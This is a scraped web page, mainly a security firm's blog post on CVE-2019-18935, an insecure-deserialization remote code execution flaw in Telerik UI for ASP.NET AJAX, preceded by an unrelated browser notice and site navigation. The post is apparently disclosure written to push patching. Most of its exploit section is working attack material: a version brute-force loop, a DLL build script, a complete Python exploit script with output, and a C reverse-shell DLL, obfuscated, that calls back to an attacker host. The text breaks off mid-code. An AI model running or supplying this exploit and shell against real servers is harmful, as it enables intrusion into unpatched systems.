=== Content from salesacademy.telekom.de_f2c98bcb_20250119_133722.html ===
You need to enable JavaScript to run this app.

×

Du benutzt den Internet Explorer.

Die Sales Academy ist fÃ¼r die Browser Google Chrome, Mozilla Firefox oder Internet Explorer Edge (Chromium) optimiert.

Bei der Nutzung des Internet Explorer 11 wird es zu EinschrÃ¤nkungen in der Nutzung der Sales Academy kommen.

 Bitte benutze einen anderen Browser!

FÃ¼r Mitarbeiter der Deutschen Telekom AG:

[YAM: Neue Browserstrategie](https://yam.telekom.de/groups/it-workplace/blog/2021/02/15/neue-browser-strategie-new-browser-strategy)

[Windows 10: Standardbrowser festlegen](https://yam.telekom.de/docs/DOC-610773)

Dein Team der Sales Academy

Hinweis schliessen



=== Content from labs.bishopfox.com_aeece5fb_20250119_133723.html ===


Cosmos

[Services](https://bishopfox.com/services)

[Resources](https://bishopfox.com/resource-center)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

[About Us](https://bishopfox.com/company)

[Get Started](https://bishopfox.com/get-started)

![](https://assets.bishopfox.com/prod-1437/Images/gigaom-badge-2024-ASM-leader.png)

Introducing Cosmos

### Named Leader of the GigaOm Radar for the third year in a row!

[Request A Demo](https://bishopfox.com/request-demo)

[Cosmos Overview](/cosmos)

Meet Cosmos: The continuous offensive security solution designed to provide proactive defense.

[Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)

Get Cosmos Attack Surface Management (CASM) for unmatched visibility into your changing external attack surface with continuous discovery and mapping.

[Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)

Cosmos Application Penetration Testing (CAPT) strengthens the security of business-critical applications with in-depth assessments.

[Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

Cosmos External Penetration Testing (CEPT) builds on Cosmos Attack Surface Management to provide the highest level of attack surface protection with post-exploitation activities.

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/poly-fox-graphic.png)

The Best Defense is a Great Offense

### See Why We're the Leaders in Offensive Security

[Explore Services](https://bishopfox.com/services)

[Application Security](/services/application-security)

Ensure your applications are secure and improve your DevSecOps practices.

* [Application Pen Testing](/services/application-penetration-testing)
* [Hybrid App Assessment](/services/hybrid-application-assessment)
* [Mobile App Assessment](/services/mobile-application-assessment)
* [View More](/services/application-security)

[Red Team & Readiness](/services/red-teaming)

Get a holistic view of your ability to defend against a real-world attack.

* [Social Engineering](/services/social-engineering)
* [Incident Response Tabletop Exercise](/services/tabletop-exercise)
* [Ransomware Readiness](/services/ransomware-readiness)

[IoT & Product Security](/services/product-security-review)

Validate interconnected devices and products are secure against attackers.

[Cloud Security](/services/cloud-penetration-testing)

Assess cloud security posture with expert testing and analysis of your environment.

[Network Security](/services/network-security)

Get insight into how skilled adversaries could establish network access and put sensitive systems and data at risk.

* [External Pen Testing](/services/external-penetration-testing)
* [Internal Pen Testing](/services/internal-penetration-testing)

[AI/ML Security Assessment](/services/ai-ml-security-assessment)

Fortify the security of rapidly evolving AI/ML applications, models, and supporting infrastructures.

[Compliance & Regulations](/services/compliance-and-frameworks)

Satisfy governance, risk, and compliance programs with our testing services.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase security in their partner ecosystems.

* [Cloud App Security Assessments (CASA)](/services/casa)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)
* [Oracle Security Assessments](/services/oracle-security-assessment)
* [View More](/services/vendor-assessments)

![](https://assets.bishopfox.com/prod-1437/Images/pages/campaign-lander-images/2023-Ponemon-Report/Ponemon-Report-Tablet_Plus-Pages-copy.png)

A Ponemon Institute Report

### The State of Offensive Security

Get the blueprint. Insights into how mature security organizations invest in offensive strategies.

[Get the Report](https://bishopfox.com/ponemon-2023-report)

[Resource Center](/resource-center)

Discover new offensive security resources, ranging from reports and eBooks to slide decks from speaking gigs.

* [Webcasts](/resources/webcasts)
* [Reports](/resources/reports)
* [eBooks & Guides](/resources/guides)
* [Cybersecurity Style Guide](/cybersecurity-style-guide)
* [View All](/resources)

[Bulletins & Advisories](/blog/advisories)

Explore the latest security bulletins and advisories released by our team.

* [Exploit for Fortinet CVE-2022-42475](/blog/exploit-cve-2022-42475)
  Latest
* [View All](/blog/advisories)

[Blog](/blog)

Dive into our blog for insights and perspectives from our offensive security experts.

* [Industry](/blog/industry)
* [Technology](/blog/technology)
* [Product](/blog/product)

[Bishop Fox Labs](/labs)

Learn more about our research and some of the most popular open-source security tools. Check them out here!

* [Hacking Tools](/tools)
* [Training Sessions](/resources/livestream)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/Tag-Cyber-Independent-Assessment-Feature-Transparent.png)

Why Partner with Us?

### Join Forces with the Leaders in Offensive Security

Independent Assessment by TAG Cyber

[Get the Report](https://bishopfox.com/resources/tag-cybers-report-cast-platform)

[Partner Program Overview](/partners)

Learn about our partner programs and see how we can work together to provide best-in-class security offerings.

[Find a Partner](/partner-directory)

Check out our awesome ecosystem of trusted partners to find the right solution for your needs.

[Become a Partner](/partners/become-a-partner)

Explore partnership opportunities and apply to join forces with Bishop Fox.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase the security of their partner ecosystems.

* [Cloud Application Security Assessments](/services/casa)
* [Mobile Application Security Assessment](/services/masa)
* [Nest Assessments](/services/nest-partner-security-assessment)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/hero-fox.png)

We're Hiring!

### Want to Work with the Best Minds in Offensive Security?

Be part of an elite team and work on projects that have a real impact.

[Explore Openings](https://bishopfox.com/careers)

[Company Overview](/company)

Get to know us. Learn about our roots and see why we're on a mission to improve security for all.

[Events](/events)

Join us at an upcoming event or peruse our speaking engagements, past and present.

[Newsroom](/news)

Read the latest articles, announcements, and press releases from Bishop Fox.

[Contact Us](/contact)

Want to get in touch? We're ready to connect.

[Career Opportunities](/careers)

We're hiring! Explore our open positions and discover why the Fox Den is a great place to build your career.

[Intern & Educational Programs](/company/internships)

Starting your offensive security journey? Check out our internships and educational programs.

[Bishop Fox Mexico](/mexico)

¡Celebramos! Bishop Fox is now in Mexico. Learn more about our expansion.

![bishopfox-mexico-logo](/static/assets/images/main-menu/bishopfox-mexico-logo.png)

Search

Cosmos

* Overview
* [Cosmos Overview](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

[Services](https://bishopfox.com/services)

* [Overview](https://bishopfox.com/services)
* [Application Security](/services/application-security)
* [Red Team & Readiness](/services/red-teaming)
* [IoT & Product Security](/services/product-security-review)
* [Cloud Security](/services/cloud-penetration-testing)
* [Network Security](/services/network-security)
* [AI/ML Security Assessment](/services/ai-ml-security-assessment)
* [Compliance & Regulations](/services/compliance-and-frameworks)
* [Assessments for Our Partners](/services/vendor-assessments)

[Resources](https://bishopfox.com/resource-center)

* [Overview](https://bishopfox.com/resource-center)
* [Resource Center](/resource-center)
* [Bulletins & Advisories](/blog/advisories)
* [Blog](/blog)
* [Bishop Fox Labs](/labs)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

* [Overview](https://bishopfox.com/partners)
* [Partner Program Overview](/partners)
* [Find a Partner](/partner-directory)
* [Become a Partner](/partners/become-a-partner)
* [Assessments for Our Partners](/services/vendor-assessments)

[About Us](https://bishopfox.com/company)

* [Overview](https://bishopfox.com/company)
* [Company Overview](/company)
* [Events](/events)
* [Newsroom](/news)
* [Contact Us](/contact)
* [Career Opportunities](/careers)
* [Intern & Educational Programs](/company/internships)
* [Bishop Fox Mexico](/mexico)

[Get Started](https://bishopfox.com/get-started)

Search

[Blog](https://bishopfox.com/blog)
// [Tech](https://bishopfox.com/blog/technology)
// [Dec 12, 2019](https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui)

# CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI

By:
[Caleb Gross, Director of Capability Development](https://bishopfox.com/authors/caleb-gross)

![Cartoon hacker finding remote code execution in Telerik UI](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Bishop-Fox_Blog-Post_Telerik_FI-01_2022-05-18-224348_nhah.jpg)

Share

*All code references in this post are also available in the [CVE-2019-18935 GitHub repo](https://github.com/noperator/CVE-2019-18935).*

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) is a widely used suite of UI components for web applications. It insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host. The Managed Security Services (MSS) team at Bishop Fox has identified and exploited internet-facing instances of Telerik UI affected by this vulnerability for our clients. Since Telerik has just responded to this issue by releasing a [security advisory for CVE-2019-18935](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization), we're sharing our knowledge about it here in an effort to raise awareness about the severity of this vulnerability, and to encourage affected users to patch and securely configure this software. Patching instructions are included at the end of this post.

Thanks to Markus Wulftange ([@mwulftange](https://twitter.com/mwulftange)) of Code White GmbH for initially discovering this insecure deserialization vulnerability and for summarizing his research. Thanks also to Paul Taylor [(@bao7uo](https://github.com/bao7uo)) who, after authoring an [exploit](https://github.com/bao7uo) to break encryption for an unrestricted file upload vulnerability, developed an extended custom payload feature that was instrumental in triggering this deserialization vulnerability.

*All code references in this post are also available in the [CVE-2019-18935 GitHub repo](https://github.com/noperator/CVE-2019-18935).*

UPDATE: Caleb presented on this topic at 2020 DerpCon, which you can watch below.

## Contents

* [Vulnerability Details Overview](#VDO)
  + [Overview of Vulnerabilities in RadAsyncUpload](#OVR)
  + [CVE-2017-11317 — Unrestricted File Upload via Weak Encryption](#CVEU)
  + [CVE-2019-18935 — Remote Code Execution via Insecure Deserialization](#CVER)
  + [What's a Mixed Mode Assembly?](#WMMA)

+ [CVE-2019-18935 Exploit Details](#Details)
  - [Identify Software Version](#ISV)
  - [Verify Deserialization Vulnerability with Sleep()](#VDVS)
  - [Exploit with Reverse Shell](#ERS)
+ [How to Patch](#HTP)
+ [Conclusion](#C)

## Vulnerability Details

The following sections will walk through two vulnerabilities in RadAsyncUpload, which is a file handler in Telerik UI for ASP.NET AJAX that enables uploading files asynchronously (i.e., without reloading the existing page). After covering the context of those two CVEs, we’ll dive deeper into the insecure deserialization vulnerability to learn if it affects your system, how the exploit works, and how you can patch systems against this vulnerability.

### Overview of Vulnerabilities in RadAsyncUpload

RadAsyncUpload has previously been the subject of a number of vulnerabilities, including CVE-2014-2217, which is a path traversal vulnerability in the handler's file upload POST requests that results in unrestricted file upload. (Don't confuse it with CVE-2017-11317, which also yields unrestricted file upload, but through a different vector…more on that shortly.)

CVE-2014-2217 is outside of the scope of this post, but it's important that we mention it here, since Telerik responded to this issue by encrypting a particular portion of file upload requests to prevent attackers from tampering with sensitive settings. Specifically, Telerik encrypted the `rauPostData` POST parameter, which contains a serialized object that holds configuration details about how the file should be handled (e.g., the destination directory on the web server where the file should be uploaded). If attackers were able to break the encryption protecting the configuration object in `rauPostData`, they could:

* Modify the configuration to allow file uploading anywhere they like on the target web server. This issue (CVE-2017-11317) is a well-known vulnerability and has already been reported on.
* Modify the type of the object in `rauPostData`, allowing them to control the object's behavior while it's being deserialized. This issue (CVE-2019-18935) is the main subject of this post.

In summary, in order to exploit insecure deserialization (CVE-2019-18935) in this file handler, we must first break the encryption that the handler uses to protect file upload POST requests (CVE-2017-11317).

### CVE-2017-11317 - Unrestricted File Upload via Weak Encryption

Until R2 2017 SP1 (v2017.2.621), RadAsyncUpload's `AsyncUploadHandler` was configured with a hard-coded key that was used to encrypt form data in file upload requests. If this encryption key was not changed from its default value of `PrivateKeyForEncryptionOfRadAsyncUploadConfiguration`, an attacker could use that key to craft a file upload request to `/Telerik.Web.Ui.WebResource.axd?type=rau` with a custom encrypted `rauPostData` POST parameter. If an attacker specified an arbitrary value for the `TempTargetFolder` variable within the encrypted `rauPostData` POST parameter, it would effectively allow file uploads to any directory where the web server had write permissions. Please refer to [@straightblast's write-up](https://github.com/straightblast/UnRadAsyncUpload/wiki) for a detailed breakdown of `rauPostData`'s structure (and of this vulnerability in general), and Telerik's [security advisory](https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/unrestricted-file-upload) for how this vulnerability was remediated.

### CVE-2019-18935 - Remote Code Execution via Insecure Deserialization

Even though the unrestricted file upload vulnerability had been extensively discussed since its discovery in 2017, Markus Wulftange [took a closer look](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html) at the way RadAsyncUpload processed the `rauPostData` parameter in file upload requests in early 2019. He noted that `rauPostData` contains both the serialized configuration object **and** the object's type. `AsyncUploadHandler` uses the type specified within `rauPostData` to prepare .NET's [`JavaScriptSerializer.Deserialize()`](https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer.deserialize?view=netframework-4.8) method to properly deserialize the object.

During deserialization, `JavaScriptSerializer` calls setter methods for the specified object type. If this type is controlled by an attacker, this can lead to a dangerous scenario where the attacker may specify the type to be a [gadget](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles). A gadget is a class within the executing scope of the application that, as a side effect of being instantiated and modified via setters or field assignment, has special properties that make it useful during deserialization. A remote code execution (RCE) gadget's properties allow it to perform operations that facilitate executing arbitrary code.

Rather than submitting the usual expected `Telerik.Web.UI.AsyncUploadConfiguration` type within `rauPostData`, an attacker can submit a file upload POST request specifying the type as an RCE gadget instead. After using the aforementioned unrestricted file upload vulnerability to upload a malicious mixed mode assembly DLL, an attacker may follow up with a second request to force `JavaScriptSerializer` to deserialize an object of type `<a href="https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller?view=netframework-4.8" target="_blank" rel="noreferrer noopener">System.Configuration.Install.AssemblyInstaller</a>`. When deserialized along with an attacker-supplied [path](https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller?view=netframework-4.8) property pointing to the uploaded DLL, this will cause the application to load the DLL into its current domain. As long as the mixed mode assembly DLL is of the same architecture as the loading process, its entry-point function [DDLMain()](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain) will be called when the DLL is loaded. For more details, please refer to Implications of Loading .NET Assemblies and [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf).

### OK, What's a Mixed Mode Assembly?

According to MSDN, a [mixed mode assembly](https://docs.microsoft.com/en-us/cpp/dotnet/mixed-native-and-managed-assemblies?view=vs-2019) contains "both unmanaged machine instructions and [CIL] instructions." If you're unfamiliar with the .NET framework, then these terms may not mean anything to you. Let's break these down a bit, starting with a useful description from Wikipedia about how programs execute when developed in .NET:

Programs written for .NET Framework execute in a software environment (in contrast to a hardware environment) named the Common Language Runtime (CLR). The CLR is an application virtual machine that provides services such as security, memory management, and exception handling. As such, computer code written using .NET Framework is called "managed code."

So, "managed" code is written to run exclusively under the CLR, a layer that wraps native compiled code to prevent some common problems (e.g., buffer overflows) and abstract away some platform-specific implementation details to make code more portable. C# is often considered a managed language as it's typically compiled to CIL (Common Intermediate Language—a platform-independent language between source code and final native machine code) to be run under the CLR. CIL, in turn, is compiled into native code by a just-in-time compiler within the CLR. Conversely, code that does *not* target the CLR is known as "unmanaged" code (e.g., your average C program).

An [assembly](https://docs.microsoft.com/en-us/dotnet/standard/assembly/) is a package containing precompiled CIL code that can be executed in the CLR. It is the most fundamental unit of deployment for a .NET application, and can be implemented as an EXE or DLL file. An assembly also contains a manifest that details, among other things, metadata about the assembly's name and version. For further reading, check out this [article about injecting .NET assemblies](https://thewover.github.io/Introducing-Donut/) which provides a useful .NET primer, and a related article on [mixed assemblies](https://thewover.github.io/Mixed-Assemblies/).

## CVE-2019-18935 Exploit Details

Now with our background knowledge of the prerequisite unrestricted file upload vulnerability (CVE-2017-11317), the deserialization vulnerability itself, and mixed mode assemblies, we can now explore this exploit step by step.

### Identify Software Version

Before attempting to exploit Telerik UI for ASP.NET AJAX, confirm first that the file upload handler is registered:

```
curl -sk <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
{ "message" : "RadAsyncUpload handler is registered successfully, however, it may not be accessed directly." }

```

Additionally, you’ll need to confirm that the web application is using a vulnerable version of this software. Conveniently, Telerik publishes a [release history](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history) that details all major software versions since April 2007.

#### Without Authentication

If the application using RadAsyncUpload does not require authentication, then you can usually find the UI version buried somewhere in the HTML source of the application's home page. The location of the version string isn't consistent, though, so the best method of locating it is to use Burp to [search](https://portswigger.net/burp/documentation/desktop/functions/search) for the regular expression `20[0-9]{2}(\.[0-9]*)+` (and make sure you check the "Regex" box). You can also accomplish this with cURL:

```
curl -skL <HOST> | grep -oE '20[0-9]{2}(\.[0-9]*)+'
```

If that doesn't work, you can alternatively search for the string `<script src="/WebResource` to identify any JavaScript files that are included in the site's home page. Choose one of the static resources there and examine its `Last-Modified` date in the HTTP response header; that date should roughly match the release date of the software. For example, a JavaScript resource bundled with UI for ASP.NET AJAX Q1 2013 (v2013.1.220, released on February 20, 2013) will read `Last-Modified: Wed, 20 Feb 2013 00:00:00 GMT` in the HTTP response header for that file.

#### With Authentication

If the application **does** require authentication, then you may be able to determine the software version via brute force. Since uploading a file with RadAsyncUpload requires providing the correct version of Telerik UI, you can use Paul Taylor’s [RAU\_crypto](https://github.com/bao7uo/RAU_crypto) exploit to submit file upload requests with known-vulnerable versions until you find one that works:

```
echo 'test' > testfile.txt
for VERSION in 2007.1423 2007.1521 2007.1626 2007.2918 2007.21010 2007.21107 2007.31218 2007.31314 2007.31425 2008.1415 2008.1515 2008.1619 2008.2723 2008.2826 2008.21001 2008.31105 2008.31125 2008.31314 2009.1311 2009.1402 2009.1527 2009.2701 2009.2826 2009.31103 2009.31208 2009.31314 2010.1309 2010.1415 2010.1519 2010.2713 2010.2826 2010.2929 2010.31109 2010.31215 2010.31317 2011.1315 2011.1413 2011.1519 2011.2712 2011.2915 2011.31115 2011.3.1305 2012.1.215 2012.1.411 2012.2.607 2012.2.724 2012.2.912 2012.3.1016 2012.3.1205 2012.3.1308 2013.1.220 2013.1.403 2013.1.417 2013.2.611 2013.2.717 2013.3.1015 2013.3.1114 2013.3.1324 2014.1.225 2014.1.403 2014.2.618 2014.2.724 2014.3.1024 2015.1.204 2015.1.225 2015.2.604 2015.2.623 2015.2.729 2015.2.826 2015.3.930 2015.3.1111 2016.1.113 2016.1.225 2016.2.504 2016.2.607 2016.3.914 2016.3.1018 2016.3.1027 2017.1.118 2017.1.228 2017.2.503 2017.2.621 2017.2.711 2017.3.913; do
    echo -n "$VERSION: "
    python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt <HOST>/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo done

```

When the file upload succeeds, you'll see a JSON response containing some encrypted data about the uploaded file:

```
{"fileInfo":{"FileName":"<NAME>","ContentType":"text/html","ContentLength":<LENGTH>,"DateJson":"<DATE>","Index":0}, "metaData":"VGhpcyBpc24ndCByZWFsIGRhdGEsIGJ1dCB0aGUgQmFzZTY0LWVuY29kZWQgZGF0YSBsb29rcyBqdXN0IGxpa2UgdGhpcy4=" }
```

Now that you’ve verified that the handler is registered and the software is using a vulnerable version, you can proceed to exploit the vulnerability.

### Verify Deserialization Vulnerability with Sleep()

In preparing to fully compromise a remote host with a reverse shell, you can initially verify the deserialization vulnerability by uploading and loading a simple mixed mode assembly DLL that causes the web application to sleep for 10 seconds. A simple program, `sleep.c`, will do just that.

*Note that I use C, rather than C++, because I've encountered rare occasions where I was unable to execute compiled C++ code on a remote server. I suspect that this is because the target environment did not have the Microsoft Visual C++ Redistributable installed.*

[sleep.c](https://github.com/noperator/CVE-2019-18935/blob/master/sleep.c)

```
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
<b>    if</b> (fdwReason == DLL_PROCESS_ATTACH)
<b>        Sleep</b>(10000);  // Time interval in milliseconds.
<b>    return</b> TRUE;
}

```

Create a bare C# class in `empty.cs` to constitute the managed portion of your mixed mode assembly:

```
<b>class</b> Empty {}

```

Then, in a Windows environment with Visual Studio installed, open a command prompt and run `build_dll.bat sleep.c`: [build\_dll.bat](https://github.com/noperator/CVE-2019-18935)

```
```vbscript
@echo off

set PROGRAM=%1
set BASENAME=%PROGRAM:~0,-2%

for /f "tokens=2-4 delims=/ " %%a in ("%DATE%") do (
    set YYYY=%%c
    set MM=%%a
    set DD=%%b
)
for /f "tokens=1-4 delims=/:." %%a in ("%TIME: =0%") do (
    set HH=%%a
    set MI=%%b
    set SS=%%c
    set FF=%%d
)
set DATETIME=%YYYY%%MM%%DD%%HH%%MI%%SS%%FF%

@echo on

for %%a in (x86 amd64) do (
    setlocal
    call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat" %%a
    csc /target:module empty.cs
    cl /c %PROGRAM%
    link /DLL /LTCG /CLRIMAGETYPE:IJW /out:%BASENAME%_%DATETIME%_%%a.dll %BASENAME%.obj empty.netmodule
    del %BASENAME%.obj empty.netmodule
    endlocal
)
```

```

This batch script accomplishes the following:

* Sets environment variables to compile both 32- and 64-bit code
* Compiles the `empty.cs` C# program as a `.netmodule` file (without generating an assembly)
* Compiles the specified C program (`sleep.c`, in this case) as an `.obj` file (without linking)
* Links the compiled `.netmodule` and `.obj` files, which creates a mixed mode assembly DLL with a unique name

#### A Cautionary Note About Assembly Names

The assembly's name as specified in `link /out` is baked into the assembly's manifest, and will persist even if the file name changes on disk. It's crucial that the assembly is uniquely named at linking time since a .NET application will **only load an assembly once** with a given name. This means that an assembly "`sleep_123.dll`" may cause the application to sleep the first time that DLL is loaded through deserialization, but it certainly won't successfully load again; you'll need to rerun `build_dll.bat` to generate a new assembly for each exploit attempt on the same server.

Before uploading the DLL, it's important to understand what's going to happen on disk on the remote server. RadAsyncUpload will upload your file to a temporary directory whose location is under your control. If you happen to upload two files with the same name (we're talking about file names on disk, not assembly names in a manifest), RadAsyncUpload will *append* (not overwrite!) the new file to the old one. If the application attempts to load the resulting malformed DLL, it can cause the application to crash—so it's extremely important that you use a unique file name each time you upload a file to the target.

#### Exploit

The following exploit script leverages the core RadAsyncUpload encryption logic provided by Paul Taylor's `RAU_crypto.py` to craft an encrypted `rauPostData` POST parameter; this enables access to the vulnerable `AsyncUploadHandler` class through which we can upload files and deserialize arbitrary object types. This script also ensures that each uploaded file has a unique name on disk.

[CVE-2019-18935.py](https://github.com/noperator/CVE-2019-18935/blob/master/CVE-2019-18935.py)

```
```python
#!/usr/bin/env python3

# Import arbitrary file upload functionality.
from sys import path
path.insert(1, 'RAU_crypto')
from RAU_crypto import RAUCipher

from argparse import ArgumentParser
from json import dumps, loads
from os.path import basename, splitext
from pprint import pprint
from requests import post
from requests.packages.urllib3 import disable_warnings
from sys import stderr
from time import time
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(category=InsecureRequestWarning)

def send_request(files):
    response = post(url, files=files, verify=False)
    try:
        result = loads(response.text)
        result['metaData'] = loads(RAUCipher.decrypt(result['metaData']))
        pprint(result)
    except:
        print(response.text)

def build_raupostdata(object, type):
    return RAUCipher.encrypt(dumps(object)) + '&' + RAUCipher.encrypt(type)

def upload():

    # Build rauPostData.
    object = {
        'TargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(''), version),
        'TempTargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(temp_target_folder), version),
        'MaxFileSize': 0,
        'TimeToLive': {
            'Ticks': 1440000000000,
            'Days': 0,
            'Hours': 40,
            'Minutes': 0,
            'Seconds': 0,
            'Milliseconds': 0,
            'TotalDays': 1.6666666666666666,
            'TotalHours': 40,
            'TotalMinutes': 2400,
            'TotalSeconds': 144000,
            'TotalMilliseconds': 144000000
        },
        'UseApplicationPoolImpersonation': False
    }
    type = 'Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=' + version + ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'
    raupostdata = build_raupostdata(object, type)

    with open(filename_local, 'rb') as f:
        payload = f.read()

    metadata = {
        'TotalChunks': 1,
        'ChunkIndex': 0,
        'TotalFileSize': 1,
        'UploadID': filename_remote  # Determines remote filename on disk.
    }

    # Build multipart form data.
    files = {
        'rauPostData': (None, raupostdata),
        'file': (filename_remote, payload, 'application/octet-stream'),
        'fileName': (None, filename_remote),
        'contentType': (None, 'application/octet-stream'),
        'lastModifiedDate': (None, '1970-01-01T00:00:00.000Z'),
        'metadata': (None, dumps(metadata))
    }

    # Send request.
    print('[*] Local payload name: ', filename_local, file=stderr)
    print('[*] Destination folder: ', temp_target_folder, file=stderr)
    print('[*] Remote payload name:', filename_remote, file=stderr)
    print(file=stderr)
    send_request(files)

def deserialize():

    # Build rauPostData.
    object = {
        'Path': 'file:///' + temp_target_folder.replace('\\', '/') + '/' + filename_remote
    }
    type = 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
    raupostdata = build_raupostdata(object, type)

    # Build multipart form data.
    files = {
        'rauPostData': (None, raupostdata),  # Only need this now.
        '': ''  # One extra input is required for the page to process the request.
    }

    # Send request.
    print('\n[*] Triggering deserialization...\n', file=stderr)
    start = time()
    send_request(files)
    end = time()
    print('\n[*] Response time:', round(end - start, 2), 'seconds', file=stderr)

if __name__ == '__main__':
    parser = ArgumentParser(description='Exploit deserialization vulnerability in Telerik UI for ASP.NET AJAX.')
    parser.add_argument('-v', dest='version', required=True, help='software version')
    parser.add_argument('-p', dest='payload', required=True, help='mixed mode assembly DLL')
    parser.add_argument('-f', dest='folder', required=True, help='destination folder on target')
    parser.add_argument('-t', dest='test_upload', action='store_true', help="just test upload, don't exploit deserialization vuln")
    parser.add_argument('-u', dest='url', required=True, help='https:///Telerik.Web.UI.WebResource.axd?type=rau')
    args = parser.parse_args()

    temp_target_folder = args.folder.replace('/', '\\')
    version = args.version
    filename_local = args.payload
    filename_remote = str(time()) + splitext(basename(filename_local))[1]
    url = args.url

    upload()

    if not args.test_upload:
        deserialize()
```

```

Without being able to remotely determine the architecture of the web server's underlying host, you may need to attempt to trigger this vulnerability with both the 32- and 64-bit DLL versions until you find one that works. Invoke the script as follows:

```
python3 CVE-2019-18935.py -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -v <VERSION> -f 'C:\Windows\Temp' -p sleep_2019121205271355_x86.dll

[*] Local payload name:  sleep_2019121205271355_x86.dll
[*] Destination folder:  C:\Windows\Temp
[*] Remote payload name: 1576142987.918625.dll

{'fileInfo': {'ContentLength': 75264,
              'ContentType': 'application/octet-stream',
              'DateJson': '1970-01-01T00:00:00.000Z',
              'FileName': '1576142987.918625.dll',
              'Index': 0},
 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '
                                     'Telerik.Web.UI, Version=<VERSION>, '
                                     'Culture=neutral, '
                                     'PublicKeyToken=<TOKEN>',
              'TempFileName': '1576142987.918625.dll'}}

[*] Triggering deserialization...

<title>Runtime Error</title>
<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
<h2> <i>Runtime Error</i> </h2></span>
...omitted for brevity...

[*] Response time: 13.01 seconds

```

If the application pauses for approximately 10 seconds before responding, you've got a working deserialization exploit!

### Exploit with Reverse Shell

Now that we've verified that we can exploit this vulnerable version of Telerik UI for ASP.NET AJAX, we can instead exploit it with a DLL that spawns a reverse shell to connect back to a server that we control. We use `rev_shell.c` below, a program that launches a reverse shell as a thread when the DLL is loaded; the threaded nature of this program prevents the shell process from blocking the web application's user interface while running: [rev\_shell.c](https://github.com/noperator/CVE-2019-18935)

```
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

#define HOST "<HOST>"
#define PORT <PORT>

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

// Adapted from https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c
void ReverseShell()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host = gethostbyname(HOST);
    strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(PORT);
    hax.sin_addr.s_addr = inet_addr(aip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    if (WSAGetLastError() == 0) {

        memset(&ini_processo, 0, sizeof(ini_processo));

        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        char *myArray[4] = { "cm", "d.e", "x", "e" };
        char command[8] = "";
        snprintf(command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    }
}

DWORD WINAPI MainThread(LPVOID lpParam)
{
    ReverseShell();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread;

